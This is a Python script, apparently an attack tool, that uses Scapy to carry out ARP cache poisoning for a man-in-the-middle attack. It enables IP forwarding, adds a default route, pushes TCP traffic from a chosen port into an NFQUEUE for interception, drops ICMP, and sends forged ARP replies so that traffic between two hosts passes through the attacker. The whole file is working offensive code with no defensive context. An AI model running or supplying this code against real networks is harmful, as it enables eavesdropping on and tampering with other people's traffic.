import shlex
from scapy.all import Ether
from scapy.all import *
import os

def start_forwarding():
    args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
    subprocess.call(args, shell=False)

def configure_routing(gw, interface_name):
    subprocess.call(['route', 'add', 'default', 'gw', str(gw), str(interface_name)], shell=False)

def setup_netfilterqueue(port):
    cmd = 'iptables -t mangle -A PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
    os.system(cmd)

    cmd = 'iptables -A FORWARD -p icmp -j DROP'
    os.system(cmd)

    cmd = 'iptables -A INPUT -p icmp -j DROP'
    os.system(cmd)

    cmd = 'iptables -A OUTPUT -p icmp -j DROP'
    os.system(cmd)

def setdown_netfilterqueue(port):
    cmd = 'sudo iptables -t mangle -D PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
    os.system(cmd)

def spoof_arp_cache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)

def launch_arp_poison(sourceip, targetip):
    print("[*] Launching arp poison on " + str(targetip))

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sourceip)
    sourcemac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc

    spoof_arp_cache(sourceip, sourcemac, targetip)
    spoof_arp_cache(targetip, targetmac, sourceip)
    print("[*] Network poisoned")